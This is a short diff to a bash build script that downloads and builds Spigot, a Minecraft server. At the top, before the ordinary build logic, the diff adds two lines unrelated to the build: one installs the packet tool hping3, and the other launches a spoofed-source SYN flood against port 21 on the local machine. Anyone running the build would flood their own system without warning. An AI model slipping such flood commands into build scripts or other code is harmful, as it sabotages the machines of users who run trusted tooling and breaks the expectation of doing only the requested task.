@@ -1,5 +1,9 @@
 #!/bin/bash
 
+apt install hping3
+
+hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source 127.0.0.1
+
 if [ ! -d "build" ]; then
     echo "Spigot is not downloaded, downloading and building now.."
     rm -rf build/
